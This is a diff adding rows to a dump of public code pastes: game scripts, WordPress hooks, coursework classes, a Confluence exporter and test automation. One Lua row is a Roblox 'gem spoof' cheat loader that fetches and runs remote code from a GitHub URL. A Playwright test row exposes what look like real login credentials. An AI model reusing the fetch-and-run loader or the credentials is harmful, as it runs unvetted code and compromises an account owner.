+5. After running, proceed to populate the generated files and directories with your project's code and documentation.
+
+This script is provided by RapidMod, a platform dedicated to enhancing the development workflow through
+streamlined project setup and management tools. For more tools and resources, visit https://rapidmod.io/.
+
+Note: This is an initial structure setup. Depending on the project's evolution, modifications might be required
+to accommodate specific needs or preferences.
+
+Author: RapidMod
+Website: https://rapidmod.io/
+""""""
+
+import os
+
+dirs = [
+    ""src/app/libs"",
+    ""src/app/utils"",
+    ""src/app/services"",
+    ""tests"",
+]
+
+files = [
+    ""src/app/run.py"",
+    "".gitignore"",
+    ""requirements.txt"",
+    ""README.md"",
+]
+
+for directory in dirs:
+    os.makedirs(directory, exist_ok=True)
+    print(f""Directory {directory} created."")
+
+for file in files:
+    with open(file, 'w') as fp:
+        pass  # Just to create the file
+    print(f""File {file} created."")"
+Vn9EE0e6,Mad,Unknown_No_1,PHP,Thursday 4th of April 2024 07:48:17 AM CDT,TargetOnlyConquer
+LFFyaEqM,PS99 Visual Gem Spoof/Changer Script,quikzyYTbtw,Lua,Thursday 4th of April 2024 07:29:34 AM CDT,"loadstring(game:HttpGet((""https://raw.githubusercontent.com/venoxw/venox-hub/main/ps99-gemspoof"")))()
+-- made by venox.w#0000"
+61e3uhPK,Server Squid game,sriyanto,Lua,Thursday 4th of April 2024 07:12:42 AM CDT,"local TweenService = game:GetService(""TweenService"")
+local Players = game:GetService(""Players"")
+local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
+local Map = game.Workspace.Map
+local Doll = Map.Doll
+local TimerUI = Map.Timer.UI
+local ROUND_DURATION_SECONDS = 60 --1 minute
+local isRedLight = ReplicatedStorage.isRedLight
+local savedPlayerPositions = {} --logging all player positions when there is a red light, so we can later check their movements
+local SpinTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+local OriginalHeadCFrame = Doll.Head.CFrame
+local GreenLightHead = TweenService:Create(Doll.Head, SpinTweenInfo, {
+	CFrame = OriginalHeadCFrame
+})
+local RedLightHead = TweenService:Create(Doll.Head, SpinTweenInfo, {
+	CFrame = OriginalHeadCFrame * CFrame.Angles(0,math.rad(180),0) --180 Degrees Rotation
+})
+function DressCharacterInSuit(character)
+	for _, object in pairs(character:GetChildren()) do
+		if object:IsA(""Shirt"") or object:IsA(""Pants"") or object:IsA(""ShirtGraphic"") then
+			object:Destroy()
+		end
+	end
+	local Shirt = Instance.new(""Shirt"")
+	Shirt.ShirtTemplate = ""rbxassetid://7597521537""
+	Shirt.Parent = character
+	local Pants = Instance.new(""Pants"")
+	Pants.PantsTemplate = ""rbxassetid://7597288954""
+	Pants.Parent = character
+end
+function SecondsToTimestamp(seconds)
+	seconds = math.max(seconds, 0)
+	local minutes = tostring(math.floor(seconds/60))
+	local leftoverSeconds = tostring(seconds%60)
+	if #leftoverSeconds ==1 then
+		leftoverSeconds = ""0""..leftoverSeconds
+	end
+	return tostring(minutes).."":""..leftoverSeconds
+end
+function LogPlayerPositions(players)
+	for _, player in pairs(players) do
+		if player.Character then
+			local HumanoidRootPart = player.Character:FindFirstChild(""HumanoidRootPart"")
+			if HumanoidRootPart then
+				savedPlayerPositions[player] = HumanoidRootPart.Position
+			end
+		end
+	end
+end
+function StartGame()
+	GreenLightHead:Play()
+	isRedLight.Value = false
+	savedPlayerPositions = {}
+	local playersInRound = Players:GetPlayers()
+	local winners = {}
+	local spinDelay = 3
+	local lastSpin = tick()
+	local endTouch
+	for _, player in pairs(playersInRound) do
+		player:LoadCharacter()
+		DressCharacterInSuit(player.Character)
+	end
+	endTouch = Map.EndBarrier.Touched:Connect(function(toucher)
+		if not toucher or not toucher.Parent then
+			return
+		end
+		local touchChar = toucher.Parent
+		local touchPlayer = Players:GetPlayerFromCharacter(touchChar)
+		if touchPlayer then
+			local winnersIndex = table.find(winners, touchPlayer)
+			if winnersIndex then return end
+			table.insert(winners, touchPlayer)
+			local playerIndex = table.find(playersInRound, touchPlayer)
+			if playerIndex then
+				table.remove(playersInRound, playerIndex)
+			end
+		end	
+	end)
+	--keeping the timer updated
+	--checking if players move
+	for i =ROUND_DURATION_SECONDS, 0, -1 do
+		TimerUI.TimeLabel.Text = SecondsToTimestamp(i)
+		if isRedLight.Value then
+			--Get the position of players, check if players have moved
+			for player, savedPosition in pairs(savedPlayerPositions) do
+				if player.Character then
+					local winnerIndex = table.find(winners,player)
+					if winnerIndex then
+						continue
+					end
+					local HumanoidRootPart = player.Character:FindFirstChild(""HumanoidRootPart"")
+					if HumanoidRootPart then
+						if(HumanoidRootPart.Position-savedPosition).Magnitude >= 1 then
+							player.Character:BreakJoints() --kill the player
+							savedPlayerPositions[player] = nil
+							--Remove the player from the round table
+							local playerIndex = table.find(playersInRound, player)
+							if playerIndex then
+								table.remove(playersInRound, playerIndex)
+							end
+						end
+					end
+				end
+			end
+		end
+		if tick()-lastSpin >= spinDelay then --Has 5 seconds gone by since the last turn
+			if isRedLight.Value == true then
+				--Make it a green light
+				isRedLight.Value = false
+				GreenLightHead:Play()
+			else
+				--Make it a red light
+				isRedLight.Value = true
+				RedLightHead:Play()
+				RedLightHead.Completed:Wait()
+				LogPlayerPositions(playersInRound)
+			end
+			lastSpin = tick()
+			spinDelay = spinDelay * 0.95 -- Make it 10% faster each time
+		end
+	if #playersInRound == 0 then
+			break
+		end
+		task.wait(1) --Important
+	end
+	--by this time, the game is over
+	endTouch:Disconnect()
+	for _, winner in pairs(winners) do
+		winner.leaderstats.Cash.Value +=5
+		if winner.Character then
+		end
+	end
+	print(""Round Over!"")
+end
+--Main game loop
+while true do
+	print(""Waiting 5 seconds before starting a new game."")
+	task.wait(5)
+	StartGame()
+end"
+QjY0WXh8,Mad,Unknown_No_1,PHP,Thursday 4th of April 2024 07:06:17 AM CDT,LongLiveAurangzeb
+xjsLV3NA,Send new post content via webhook,drkskwlkr,PHP,Thursday 4th of April 2024 07:02:22 AM CDT,"add_action('publish_post', function( $ID, $post ) {
+    if ($post->post_type == 'post') {
+        $webhook_url = 'https://example.com/webhook-endpoint';
+
+        $response = wp_remote_post(
+            $webhook_url,
+            array(
+                'method' => 'POST',
+                'body'   => json_encode( $post ),
+                'headers' => array('Content-Type' => 'application/json')
+            )
+        );
+    }
+}, 10, 2);"
+jRxjDz29,Eliminar documento BaseX,nightlycod3,Java,Thursday 4th of April 2024 06:59:09 AM CDT,"package main.basex;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.InputMismatchException;
+import java.util.Scanner;
+import org.basex.examples.api.BaseXClient;
+
+public class TestBorradoDocumento {
+
+    public static void main(String[] args) {
+        try (BaseXClient session = new BaseXClient(
+                ""localhost"", 1984, ""admin"", ""admin"")) {
+            String baseDatos = ""productos"";
+            String consultaNombresDocumentos = ""for $i in /* return db:path($i)"";
+            String consultaContenidoDocumentos = ""for $i in /* return $i"";
+
+            ArrayList<String> nombresDocumento = new ArrayList<>();
+            ArrayList<String> contenidoDocumento = new ArrayList<>();
+
+            session.execute(""open "" + baseDatos);
+            BaseXClient.Query query = session.query(consultaNombresDocumentos);
+
+            while (query.more()) {
+                nombresDocumento.add(query.next());
+            }
+
+            query = session.query(consultaContenidoDocumentos);
+
+            while (query.more()) {
+                contenidoDocumento.add(query.next());
+            }
+
+            for (int i = 0; i < nombresDocumento.size(); i++) {
+                System.out.println(i + "" -> "" + nombresDocumento.get(i));
+                System.out.println(contenidoDocumento.get(i));
+            }
+
+            int idDocumento = pedirNumero(""Indica el documento a borrar:"");
+            
+            if (idDocumento < 0 || idDocumento > nombresDocumento.size()) {
+                System.out.println(""El id no existe"");
+                return;
+            }
+            
+            session.execute(""delete "" + nombresDocumento.get(idDocumento));
+            System.out.println(nombresDocumento.get(idDocumento) + "" eliminado"");
+        } catch (IOException ex) {
+            System.out.println(""Error: "" + ex.getMessage());
+        }
+    }
+
+    private static int pedirNumero(String mensaje) {
+        Scanner sc = new Scanner(System.in);
+        System.out.print(mensaje + "" "");
+        int valor;
+        try {
+            valor = sc.nextInt();
+            sc.nextLine();
+        } catch (InputMismatchException ex) {
+            sc.nextLine();
+            valor = -1;
+        }
+        return valor;
+    }
+}
+"
+yhbW2MR8,ClassCar,cuniszkiewicz,C#,Thursday 4th of April 2024 06:49:16 AM CDT,"using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace OOP_1S130L_summer_2024
+{
+    internal class Car
+    {
+        //fields
+        private string brand;
+        //private string model;
+        public string color;
+        private int maximumSpeed;
+        public int horsePower;
+
+        private double oilTemp;
+
+        public double OilTempC
+        {
+            get { return oilTemp; }
+            set 
+            { 
+            if(value < 0 || value > 200)    
+                oilTemp = 90;
+            else
+                oilTemp = value;
+            }
+        }
+        public double OilTempK
+        {
+            get { return oilTemp + 273; }
+            set
+            {
+                if (value < 273 || value > 573)
+                    oilTemp = 90;
+                else
+                    oilTemp = value - 273;
+            }
+        }
+        //properties
+
+        public string Model
+        { get; set; }
+
+        public string Brand
+        { 
+        get { return brand; } set {  brand = value; }
+        }
+
+
+        public int MaximumSpeed
+        {
+            get
+            { 
+            return maximumSpeed;
+            }
+            set 
+            {
+                if (value < 100 || value > 350)
+                    maximumSpeed = 190;
+                else
+                    maximumSpeed = value;
+            }
+        }
+
+
+        //methods
+
+        public void SetMaximumSpeed(int max)
+        {
+            if (max < 100 || max > 350)
+                maximumSpeed = 190;
+            else
+                maximumSpeed = max;
+        }
+        public int GetMaximumSpeed() { return maximumSpeed; }
+
+        public void Print()
+        {
+            Console.WriteLine($""Car: {brand} {Model}, color: {color}, maximum speed: {maximumSpeed} km/h"");
+        }
+
+        public void StartEngine()
+        {
+            Console.WriteLine(""Engine started."");
+        }
+        public void StopEngine()
+        {
+            Console.WriteLine(""Engine stopped."");
+        }
+
+        public void Drive(string direction)
+        {
+            Console.WriteLine($""The car is driving to {direction}"");
+        }
+
+        public double LapTime(int distance)
+        {
+            double time = (double)distance / maximumSpeed;
+
+            return time; 
+        }
+
+
+        public Car()
+        {
+            Brand = ""VW"";
+            Model = ""Passat"";
+            color = ""Black"";
+            MaximumSpeed = 240;
+            horsePower = 140;
+        }
+
+        public Car(string _brand, string _model, string _color = ""White"", int _maximumSpeed = 200, int _horsePower = 100)
+        { 
+            Brand = _brand;
+            Model = _model;
+            color = _color;
+            MaximumSpeed = _maximumSpeed;
+            horsePower = _horsePower;
+        }
+
+        public Car(Car tempCar)
+        { 
+            Brand = tempCar.Brand;
+            Model = tempCar.Model;
+            color = tempCar.color;
+            MaximumSpeed = tempCar.MaximumSpeed;
+            horsePower = tempCar.horsePower;
+        }
+
+    }
+}
+"
+BfVpHaGj,AddToQueueLoc,SimTek,Lua,Thursday 4th of April 2024 06:44:54 AM CDT,"local rs = game:GetService(""ReplicatedStorage"")
+local purgeBattleRe = rs:WaitForChild(""PurgeBattleRe"")
+local sign = script.Parent
+local players = game:GetService(""Players"")
+local player = players.LocalPlayer
+
+purgeBattleRe.OnClientEvent:Connect(function(isInQueue)
+	if isInQueue then
+		sign.Text = ""You are in the queue "" .. player.Name
+	else
+		sign.Text = ""Add to Queue""
+	end
+end)"
+QQb1kMDB,Untitled,gm4r1n,JavaScript,Thursday 4th of April 2024 06:44:47 AM CDT,"const { test, expect } = require(""@playwright/test"");
+const { Placeholder, PageItem } = require(""react-bootstrap"");
+
+test.beforeEach(async ({ page }) => {
+  await page.goto(""http://localhost:3000/login"");
+  await page.locator(""input[type='email']"").fill(""gsmarinov.mc@gmail.com"");
+  await page.locator(""input[type='password']"").fill(""QA@MClimate-2023"");
+  await page.locator(""button[type='submit']"").click();
+});
+
+//Create different describes for different buildings/ Example:
+//test.decribe(""Create buildings"", () => { ..... insert tests for different buildings here....}); etc. for different cases
+//place beforeEach in each test if it needs a repetitive task
+test(""Create F+S+R building"", async ({ page }) => {
+  await page
+    .locator(
+      '[class=""btn btn-primary waves-effect waves-light float-md-end btn btn-primary""]'
+    )
+    .click();
+  await page.locator('input[placeholder=""Name""]').fill(""F+S+R(Playwright)"");
+  await page.locator('input[placeholder=""Address""]').fill(""Sofia, Bulgaria"");
+  await page.locator('button[type=""button""]', { hasText: ""Next"" }).click();
+  await page.locator('button[type=""button""]', { hasText: ""Prev"" }).click();
+  await page.locator('button[type=""button""]', { hasText: ""Next"" }).click();
+  await page.locator('[placeholder=""Building size sq.m""]').fill(""123"");
+  await page.locator('[placeholder=""Year of built""]').fill(""1234"");
+  await page
+    .locator('[placeholder=""Yearly energy costs (in €)""]')
+    .fill(""12345"");
+  // await page.locator('input[type=""radio""]#heatingType-2').click(); - TRY WITH SELECTING HEATING AND BUILDING TYPE!!!
+  await page.locator('button[type=""button""]', { hasText: ""Next"" }).click();
+  await page
+    .locator('button[type=""button""]', { hasText: ""Yes, create"" })
+    .click();
+  await page.locator('[placeholder=""Floors""]').clear();
+  await page.locator('[placeholder=""Floors""]').fill(""5"");
+  await page.click("".floors-inputs"");
+  await page.locator('[placeholder=""Floors""]').clear();
+  await page.locator('[placeholder=""Floors""]').fill(""1"");
+  await page.click("".floors-inputs"");
+  for (let i = 0; i < 4; i++) {
+    await page
+      .locator('button[type=""button""]', { hasText: ""Add a new floor"" })
+      .click();
+  }
+  for (let i = 0; i < 4; i++) {
+    await page
+      .locator('button[type=""button""][aria-label=""delete""]')
+      .last()
+      .click();
+  }
+  for (let i = 0; i < 4; i++) {
+    await page
+      .locator('button[type=""button""]', { hasText: ""Add a new floor"" })
+      .click();
+  }
+  for (let i = 0; i < 2; i++) {
+    const elements = await page.$$(
+      'button[type=""button""][aria-label=""delete""]'
+    );
+    const middleElement = Math.floor(elements.length / 2);
+    await elements[middleElement].click();
+  }
+
+  for (let i = 0; i < 2; i++) {
+    await page
+      .locator('button[type=""button""]', { hasText: ""Add a new floor"" })
+      .click();
+  }
+  await page.locator('button[type=""button""]', { hasText: ""Next"" }).click();
+
+  //Create floors
+  await page
+    .locator('button[type=""button""]', { hasText: ""Yes, create"" })
+    .click();
+
+  //Create spaces - select space type
+  //await page.locator('[class=""radio-element-container ""]  ')
+
+  //await page.locator('input[type=""radio""] #spaceType-3]').click();
+  //await page.click('input[id=""spaceType-3""]');
+  //await page.check('#spaceType-3');
+  await page.evaluate(() => {
+    document.querySelector('input[id=""spaceType-3""]').click();
+  });
+  await page.waitForSelector(""#spaceType-3"", { state: ""attached"" });
+  // await page.check('#spaceType-2');
+  //await page.locator('#spaceType-3').check();
+
+  await page.locator('button[type=""button""]', { hasText: ""Next"" }).click();
+  await page.locator('button[type=""button""]', { hasText: ""Floor 1"" }).click();
+  for (let i = 0; i  < 4; i++) {
+    await page
+      .locator('button[type=""button""]', {
+        hasText: ""+ Create a new Class Room"",
+      })
+      .first()
+      .click();
+  }
+
+  for(let i=0; i<4; i++){
+    await page.locator('button[type=""button""][aria-label=""delete""]').last().click();
+  }
+  // for (let i = 0; i < 2; i++) {
+    //page.waitForSelector('button[type=""button""][aria-label=""delete""]');
+    // await page.waitForTimeout(1000); 
+    // const elements = await page.$$(
+    //   'button[type=""button""][aria-label=""delete""]'
+    // );
+    // const middleElement = Math.floor(elements.length / 2);
+    // await elements[middleElement].click();
+    //await page.waitForTimeout(1000); 
+    // try {
+    //   for (let i = 0; i < 2; i++) {
+    //     await page.waitForSelector('button[type=""button""][aria-label=""delete""]');
+    //     const elements = await page.$$('button[type=""button""][aria-label=""delete""]');
+    //     const middleElement = Math.floor(elements.length / 2);
+    //     console.log(""Number of elements:"", elements.length);
+    //     console.log(""Middle element index:"", middleElement);
+    //     await elements[middleElement].click();
+    //     console.log(""Clicked on middle element"");
+    //     await page.waitForTimeout(1000);
+    //   }
+    // } catch (error) {
+    //   console.error(""An error occurred:"", error);
+    // }
+    
+  });
+//delete building after test to prevent build-up of multiple identical buildings during test - FOR TEST PURPOSES ONLY!!!
+test.afterEach(async ({ page }) => {
+  await page.goto(""http://localhost:3000/buildings"");
+ if(('[class=""d-flex align-items-center justify-content-between card-title""]',
+ { hasText: ""F+S+R(Playwright)"" }))
+ {
+  while (
+    ('[class=""d-flex align-items-center justify-content-between card-title""]',
+    { hasText: ""F+S+R(Playwright)"" })
+  ) {
+    await page
+      .locator(
+        '[class=""d-flex align-items-center justify-content-between card-title""]',
+        { hasText: ""F+S+R(Playwright)"" }
+      )
+      .first()
+      .click();
+    await page
+      .locator('button[type=""button""]', { hasText: ""Edit building"" })
+      .click();
+    await page.locator('button[type=""button""]', { hasText: ""Delete"" }).click();
+    await page
+      .locator('[class=""btn btn-xs btn-primary w-md btn btn-danger ""]', {
+        hasText: ""Yes, delete"",
+      })
+      .click();
+  }
+ }
+  // await page.locator('[""d-flex align-items-center justify-content-between card-title""]', {hasText: ""F+S+R""}).click();
+});
+"
+hKP2j6yY,Confluence Hierarchical HTML Download,bob123world,Python,Thursday 4th of April 2024 06:43:49 AM CDT,"from atlassian import Confluence
+import os
+
+# Configuration
+site_url = 'https://your-domain.atlassian.net/wiki'
+username = 'your-email@example.com'
+api_token = 'your_api_token'
+
+# Initialize Confluence client
+confluence = Confluence(
+    url=site_url,
+    username=username,
+    password=api_token
+)
+
+def fetch_hierarchy(space_key):
+    """"""
+    Fetch all pages within a space and build a hierarchy map.
+    """"""
+    hierarchy = {}
+    all_pages = confluence.get_all_pages_from_space(space=space_key, status=""current"", expand='ancestors')
+    
+    for page in all_pages:
+        page_id = page['id']
+        ancestors = page.get('ancestors', [])
+        if ancestors:
+            parent_id = ancestors[-1]['id']  # Last ancestor is the direct parent
+            if parent_id in hierarchy:
+                hierarchy[parent_id].append(page_id)
+            else:
+                hierarchy[parent_id] = [page_id]
+        else:
+            # Page is a top-level page
+            hierarchy['root'] = hierarchy.get('root', []) + [page_id]
+    
+    return hierarchy
+
+def save_page_and_children_as_html(page_id, parent_dir):
+    """"""
+    Recursively save a page and its children as HTML, creating directories as needed.
+    """"""
+    page = confluence.get_page_by_id(page_id, expand='body.storage,title')
+    page_title = page['title'].replace('/', '_')  # Sanitize title for use in filenames
+    directory = os.path.join(parent_dir, page_title)
+    os.makedirs(directory, exist_ok=True)
+    
+    # Save the current page
+    filename = os.path.join(directory, f""{page_title}.html"")
+    with open(filename, 'w', encoding='utf-8') as file:
+        file.write(page['body']['storage']['value'])
+    
+    # Recursively save children
+    if page_id in hierarchy:
+        for child_id in hierarchy[page_id]:
+            save_page_and_children_as_html(child_id, directory)
+
+space_key = 'YOURSPACEKEY'  # Replace with your actual space key
+output_dir = 'ConfluenceExport'  # Base directory for the exported pages
+
+# Ensure the output directory exists
+os.makedirs(output_dir, exist_ok=True)
+
+# Fetch the page hierarchy
+hierarchy = fetch_hierarchy(space_key)
+
+# Recursively save each top-level page and its hierarchy as HTML
+for page_id in hierarchy.get('root', []):
+    save_page_and_children_as_html(page_id, output_dir)"
+zT3F5YU9,AddToQueue,SimTek,Lua,Thursday 4th of April 2024 06:42:21 AM CDT,"local clicker = script.Parent
+local cs = game:GetService(""CollectionService"")
+local signIn = clicker.Parent.Parent
+local placeName = signIn.Configuration.PlaceName.Value
+local rs = game:GetService(""ReplicatedStorage"")
+local purgeBattleRe = rs:WaitForChild(""PurgeBattleRe"")
+local placeId = signIn.Configuration.PlaceId.Value
+local snd = signIn.Announcement
+local battleLbl = signIn.Wall.SurfaceGui.BattleLbl
+local ts = game:GetService(""TeleportService"")
+
+clicker.MouseClick:Connect(function(player)
+	local tag = cs:HasTag(player, placeName)
+	
+	if tag then
+		print(""remove player in the queue"", player.Name)
+		purgeBattleRe:FireClient(player, false)
+		cs:RemoveTag(player, placeName)
+	else
+		print(""add player to the queue"", player.Name)
+		purgeBattleRe:FireClient(player, true)
+		cs:AddTag(player, placeName)
+	end
+end)
+
+while true do
+	local lst = cs:GetTagged(placeName) 
+	print(""lst = "", lst)
+	if lst and #lst > 0 then
+		snd:Play()
+		for i=10, 1, -1 do
+			print(""count down = "", i)
+			battleLbl.Text = ""The "" .. placeName .. "" is starting in ""
+				.. i .. "" seconds with "" .. #lst .. "" players""
+			wait(1)
+			lst = cs:GetTagged(placeName)
+			if #lst == 0 then
+				break
+			end
+		end
+		if #lst > 0 then
+			battleLbl.Text = ""Teleporting... ""
+			local code = ts:ReserveServer(placeId)
+			ts:TeleportToPrivateServer(placeId, code, lst)
+			wait(6)
+		end
+	end
+	wait(1)
+	battleLbl.Text = ""The Purge Battle!""
+end"
+2bc1kvpm,СПРИНТ № 6 | Просто о сложности. Теория быстродействия | Урок 7: Опасности экспоненты (2/2),chevengur,C++,Thursday 4th of April 2024 06:36:41 AM CDT,"#include <iostream>
+#include <string>
+
+using namespace std;
+
+
+template <typename F>
+string BruteForce(F check) {
+    string str = ""TABRA"";
+    for (str[0] = 'A'; str[0] <= 'Z'; ++str[0])
+    {
+        for (str[1] = 'A'; str[1] <= 'Z'; ++str[1])
+        {
+            for (str[2] = 'A'; str[2] <= 'Z'; ++str[2])
+            {
+                for (str[3] = 'A'; str[3] <= 'Z'; ++str[3])
+                {
+                    for (str[4] = 'A'; str[4] <= 'Z'; ++str[4])
+                    {
+                        if (check(str)) {
+                            return str;
+                        }
+                    }
+                }
+            }
+        }
+    } 
+    return {};
+}
+
+int main() {
+    string pass = ""ARTUR""s;
+    auto check = [pass](const string& s) {
+        return s == pass;
+        };
+    cout << BruteForce(check) << endl;
+}"
+JTbRttq6,Untitled,matoni555,PHP,Thursday 4th of April 2024 06:33:30 AM CDT,"function matosoft_download_ics() {
+
+	if (isset($_GET['download_ics']) && isset($_GET['event_name'])) {
+		sendEventIcs($_GET['event_name']);
+	}
+
+}
+add_action('init', 'matosoft_download_ics');
+
+
+
+function sendEventIcs($eventSlug) {
+
+	$query = new WP_Query([
+		'post_type' => 'event',
+		'post_status' => 'publish',
+		'name' => $eventSlug,
+	]);
+
+	if ($query->have_posts()) {
+		while ($query->have_posts()) {
+			$query->the_post();
+
+			$title = get_the_title();
+			$location = get_field('place-calendar');
+			$description = get_the_content();
+			$dateFromStr = get_field('date-from');
+			$dateToStr = get_field('date-to');
+			$timeFrom = get_field('time-from');
+			$timeTo = get_field('time-to');
+
+		}
+	} else {
+		exit;
+	}
+	wp_reset_postdata();
+
+	$filename = $eventSlug . '.ics';
+
+	header('Expires: 0');
+	header('Cache-Control: no-cache, no-store, must-revalidate');
+	header('Cache-Control: pre-check=0, post-check=0, max-age=0', false);
+	header('Pragma: no-cache');
+	header('Content-Type: text/calendar; charset=utf-8');
+	header('Content-Disposition:attachment; filename=' . $filename);
+	header('Content-Type: application/force-download');
+
+	$url = '';
+	$eventListPageId = getPageIdWithTemplate('page-templates/event-list.php');
+
+	if ($eventListPageId) {
+		$url = get_permalink($eventListPageId) . '#' . $eventSlug;
+	}
+
+	$timezone = new \DateTimeZone(get_option('timezone_string'));
+	$dateFrom = \DateTime::createFromFormat('Y-m-d', $dateFromStr);
+	$dateFrom->setTimezone($timezone);
+	$dateFrom->setTime(0, 0, 0);
+
+	if ($timeFrom) {
+		$timeFromParsed = explode(':', $timeFrom);
+		$dateFrom->setTime($timeFromParsed[0], $timeFromParsed[1]);
+	}
+
+	$dateTo = clone $dateFrom;
+
+	if ($dateToStr) {
+		$dateTo = \DateTime::createFromFormat('Y-m-d', $dateToStr);
+	}
+
+	$dateTo->setTimezone($timezone);
+	$dateFrom->setTime(23, 59, 59);
+
+	if ($timeTo) {
+		$timeToParsed = explode(':', $timeTo);
+		$dateTo->setTime($timeToParsed[0], $timeToParsed[1]);
+	}
+
+	$ics = new ICS([
+		'location' => $location,
+		'description' => $description,
+		'dtstart' => $dateFrom->format('c'),
+		'dtend' => $dateTo->format('c'),
+		'summary' => $title,
+		'url' => $url,
+	]);
+
+	echo $ics->to_string();
+	exit();
+
+}"
+Ge1ms37k,Untitled,35657,C++,Thursday 4th of April 2024 06:22:19 AM CDT,"#include <iostream>
+
+using namespace std;
+
+class Set {
+
+public:
+
+    struct Node {
+        int value;
+        Node* left;
+        Node* right;
+        Node* parent;
+    };
+
+    Set() : root_(nullptr), size_(0) {}
+
+    Set(const Set& other) : root_(copy(other.root_, nullptr)), size_(other.size_) {}
+
+    Set(Set&& other) : root_(other.root_), size_(other.size_) {
+        other.root_ = nullptr;
+    }
+
+    Set& operator=(const Set& other) {
+        if (this != &other) {
+            clear();
+            size_ = other.size_;
+            root_ = copy(other.root_, nullptr);
+        }
+        return *this;
+    }
+
+    Set& operator=(Set&& other) {
+        if (this != &other) {
+            clear();
+            size_ = other.size_;
+            root_ = other.root_;
+            other.root_ = nullptr;
+        }
+        return *this;
+    }
+
+    void insert(const int& val) {
+        if (root_ == nullptr) {
+            root_ = new Node{ val, nullptr, nullptr, nullptr };
+            size_++;
+            return;
+        }
+        Node* parent = nullptr;
+        Node* node = root_;
+        while (node != nullptr && node->value != val) {
+            parent = node;
+            node = node->value > val ? node->left : node->right;
+        }
+        if (node == nullptr) {
+            node = new Node{ val, nullptr, nullptr, parent };
+            parent->value > val ? parent->left = node : parent->right = node;
+            size_++;
+        }
+    }
+
+    void erase(const int& val) {
+        Node* parent = nullptr;
+        Node* node = root_;
+        while (node != nullptr && node->value != val) {
+            parent = node;
+            node = node->value > val ? node->left : node->right;
+        }
+        if (node != nullptr) {
+            if (node->left == nullptr && node->right == nullptr) {
+                if (node == root_) {
+                    root_ = nullptr;
+                }
+                else {
+                    node == parent->right ? parent->right = nullptr : parent->left = nullptr;
+                }
+                delete node;
+            }
+            else if (node->left == nullptr) {
+                node->right->parent = node->parent;
+                if (node == root_) {
+                    root_ = node->right;
+                }
+                else {
+                    node == parent->right ? parent->right = node->right : parent->left = node->right;
+                }
+                delete node;
+            }
+            else if (node->right == nullptr) {
+                node->left->parent = node->parent;
+                if (node == root_) {
+                    root_ = node->left;
+                }
+                else {
+                    node == parent->right ? parent->right = node->left : parent->left = node->left;
+                }
+                delete node;
+            }
+            else {
+                Node* temp = min(node->right);
+                node->value = temp->value;
+                if (temp->right != nullptr) {
+                    temp->right->parent = temp->parent;
+                }
+                temp == temp->parent->right ? temp->parent->right = temp->right : temp->parent->left = temp->right;
+                delete temp;
+            }
+            size_--;
+        }
+    }
+
+    Node* min(Node* node) {
+        if (node != nullptr) {
+            while (node->left != nullptr) {
+                node = node->left;
+            }
+        }
+        return node;
+    }
+
+    Node* max(Node* node) {
+        if (node != nullptr) {
+            while (node->right != nullptr) {
+                node = node->right;
+            }
+        }
+        return node;
+    }
+
+    void print() {
+        print(root_);
+        cout << endl;
+    }
+
+    int size() const {
+        return size_;
+    }
+
+    void clear() {
+        clear(root_);
+        root_ = nullptr;
+        size_ = 0;
+    }
+
+    bool operator==(const Set& other) {
+        return size_ == other.size_ ? compare(min(root_), min(other.root_)) : false;
+    }
+
+    bool operator!=(const Set& other) {
+        return !(*this == other);
+    }
+
+    ~Set() {
+        clear(root_);
+    }
+
+private:
+
+    // вариант сравнения деревьев на случай разной топологии но одинакового размера 
+    bool compare(Node* a, Node* b) {
+        if (a == nullptr && b == nullptr) {
+            return true;
+        }
+        return  a->value == b->value && compare(next(a), next(b));
+    }
+
+    Node* next(Node* node) {
+        if (node != nullptr) {
+            if (node->right != nullptr) {
+                return min(node->right);
+            }
+            Node* temp = node->parent;
+            while (temp != nullptr && node->value > temp->value) {
+                temp = temp->parent;
+            }
+            return temp;
+        }
+        return node;
+    }
+
+    Node* copy(Node* node, Node* parent) {
+        if (node == nullptr) {
+            return nullptr;
+        }
+        Node* temp = new Node{ node->value, nullptr, nullptr, parent };
+        temp->left = copy(node->left, temp);
+        temp->right = copy(node->right, temp);
+        return temp;
+    }
+
+    void clear(Node* node) {
+        if (node != nullptr) {
+            clear(node->left);
+            clear(node->right);
+            delete node;
+        }
+    }
+
+    void print(Node* node) {
+        if (node != nullptr) {
+            print(node->left);
+            cout << node->value << "" "";
+            // раскомментировать для проверки построения дерева
+           /* cout << "" value "" << node->value << "" "";
+            if (node->parent) {
+                cout << "" parent "" << node->parent->value;
+            }
+            else {
+                cout << '\t';
+            }
+            if (node->left) {
+                cout << "" left "" << node->left->value;
+            }
+            else {
+                cout << '\t';
+            }
+            if (node->right) {
+                cout << "" right "" << node->right->value;
+            }
+            else {
+                cout << '\t';
+            }
+            cout << "" "" << node << endl;*/
+            print(node->right);
+        }
+    }
+
+    Node* root_;
+    int size_;
+};
+
+
+int main() {
+
+    int arr[]{ 45,30,50,27,39,90,15,70,103 };
+
+    Set st;
+
+    for (int i = 0; i < 9; i++) {
+        st.insert(arr[i]);
+    }
+
+    st.print();
+    cout << st.size() << endl;
+
+    st.print();
+    cout << st.size() << endl;
+
+    Set st2(st);
+
+    st2.print();
+    cout << st2.size() << endl;
+
+    cout << (st == st2) << endl;
+
+    st2.erase(45);
+    st2.insert(45);
+
+    st.print();
+    st2.print();
+
+    cout << (st == st2) << endl;
+}"
+hdM64mYX,a,GoldenSkin_,C++,Thursday 4th of April 2024 06:21:31 AM CDT,"Signed by ""Zyxu"", owner of ""IFMA"". Faction list / information
+
+
+
+""2nd Ranger Bat, 75th RR (B CO.)"" // https://discord.com/channels/1220777035799072888/1225328711763623966
+Faction atendee count: 
+Extra rewards: 
+
+""Task Force 144"" // https://discord.com/channels/1220777035799072888/1225325900170792980
+Faction atendee count: 
+Extra rewards: 
+
+""4th Battalion, 1st Ranger Regiment"" // https://discord.com/channels/1220777035799072888/1225129565106737262
+Faction atendee count: 
+Extra rewards: 
+
+""5th SFGD - Blue Light"" // "
